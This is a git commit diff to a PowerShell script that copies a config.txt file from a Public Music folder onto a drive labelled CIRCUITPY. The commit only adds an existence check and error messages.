894223e74bdf8c6007cf5d6f3efb08d96db68f98
RaupenInspektor <150939693+RaupenInspektor@users.noreply.github.com>
2024-03-03 19:51:41 +0100

    Update scan.ps1

--- scan.ps1
+++ scan.ps1
@@ -3,14 +3,19 @@ $volumeName = "CIRCUITPY"
 # Specify the path to look for config.txt
 $configFilePath = "C:\Users\Public\Music\config.txt"
 
-# Get the drive letter for the volume with the specified name
-$driveLetter = (Get-WmiObject Win32_Volume | Where-Object { $_.Label -eq $volumeName }).DriveLetter
+# Check if the file exists at the specified path
+if (Test-Path $configFilePath) {
+    # Get the drive letter for the volume with the specified name
+    $driveLetter = (Get-WmiObject Win32_Volume | Where-Object { $_.Label -eq $volumeName }).DriveLetter
 
-# Check if the drive letter is found
-if ($driveLetter) {
-    # Copy config.txt to the drive
-    Copy-Item -Path $configFilePath -Destination "$driveLetter\config.txt" -Force
-    Write-Host "config.txt copied to $($driveLetter)\config.txt"
+    # Check if the drive letter is found
+    if ($driveLetter) {
+        # Copy config.txt to the drive
+        Copy-Item -Path $configFilePath -Destination "$driveLetter\config.txt" -Force
+        Write-Host "config.txt copied to $($driveLetter)\config.txt"
+    } else {
+        Write-Host "Drive with volume name '$volumeName' not found."
+    }
 } else {
-    Write-Host "Drive with volume name '$volumeName' not found."
+    Write-Host "File '$configFilePath' does not exist."
 }
